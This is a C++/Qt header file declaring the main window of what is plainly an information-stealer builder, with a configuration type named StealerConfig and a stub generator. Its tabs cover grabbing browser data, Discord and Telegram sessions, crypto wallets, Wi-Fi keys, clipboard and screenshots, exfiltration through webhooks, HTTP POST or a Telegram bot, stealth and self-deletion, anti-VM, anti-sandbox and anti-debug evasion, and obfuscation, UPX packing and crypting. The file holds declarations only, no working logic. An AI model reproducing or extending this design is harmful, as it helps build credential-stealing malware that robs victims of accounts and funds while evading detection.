#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>
#include <QTabWidget>
#include <QLineEdit>
#include <QCheckBox>
#include <QComboBox>
#include <QPushButton>
#include <QTextEdit>
#include <QLabel>
#include <QSpinBox>
#include <QGroupBox>
#include "../config/config.h"
#include "../generator/stubgenerator.h"
#include "../build/compilermanager.h"
#include "../build/builder.h"

class MainWindow : public QMainWindow {
    Q_OBJECT
    
public:
    explicit MainWindow(QWidget* parent = nullptr);
    ~MainWindow();
    
private slots:
    void onBuildClicked();
    void onSaveConfigClicked();
    void onLoadConfigClicked();
    void onCompilerDetected();
    void onBuildProgress(const QString& message);
    void onBuildFinished(bool success);
    void onOutputReceived(const QString& output);
    
private:
    void setupUI();
    void createDependenciesTab();
    void createGrabberTab();
    void createExfiltrationTab();
    void createSystemInfoTab();
    void createStealthTab();
    void createAntiAnalysisTab();
    void createBuildTab();
    void createBuildOutputArea();
    
    void loadConfigToUI(const StealerConfig& config);
    StealerConfig getConfigFromUI() const;
    
    // UI Components
    QTabWidget* m_tabWidget;
    
    // Grabber tab
    QCheckBox* m_grabChromeCheck;
    QCheckBox* m_grabFirefoxCheck;
    QCheckBox* m_grabEdgeCheck;
    QCheckBox* m_grabBraveCheck;
    QCheckBox* m_grabDiscordCheck;
    QCheckBox* m_grabTelegramCheck;
    QCheckBox* m_grabWalletsCheck;
    QCheckBox* m_grabWifiCheck;
    QCheckBox* m_grabClipboardCheck;
    QCheckBox* m_captureScreenCheck;
    
    // Exfiltration tab
    QLineEdit* m_webhookUrlEdit;
    QLineEdit* m_httpPostUrlEdit;
    QLineEdit* m_telegramTokenEdit;
    QLineEdit* m_telegramChatIdEdit;
    
    // System info tab
    QCheckBox* m_collectHWIDCheck;
    QCheckBox* m_collectIPCheck;
    QCheckBox* m_collectOSInfoCheck;
    QCheckBox* m_collectInstalledAVCheck;
    QCheckBox* m_collectProcessListCheck;
    QCheckBox* m_collectSpecsCheck;
    
    // Stealth tab
    QLineEdit* m_processNameEdit;
    QLineEdit* m_mutexNameEdit;
    QCheckBox* m_selfDestructCheck;
    QCheckBox* m_meltFileCheck;
    
    // Anti-analysis tab
    QCheckBox* m_antiVMCheck;
    QCheckBox* m_antiSandboxCheck;
    QCheckBox* m_antiDebugCheck;
    QCheckBox* m_sleepEvasionCheck;
    
    // Build tab
    QLineEdit* m_outputNameEdit;
    QLineEdit* m_iconPathEdit;
    QComboBox* m_architectureCombo;
    QCheckBox* m_obfuscateCheck;
    QCheckBox* m_upxPackCheck;
    QCheckBox* m_useCrypterCheck;
    QComboBox* m_compilerCombo;
    QPushButton* m_buildButton;
    QLabel* m_compilerStatusLabel;
    
    // Build output
    QTextEdit* m_buildOutputText;
    
    // Backend
    CompilerManager* m_compilerManager;
    StubGenerator* m_stubGenerator;
    Builder* m_builder;
    StealerConfig m_config;
};

#endif // MAINWINDOW_H



// Commit 38 - 2024-05-14
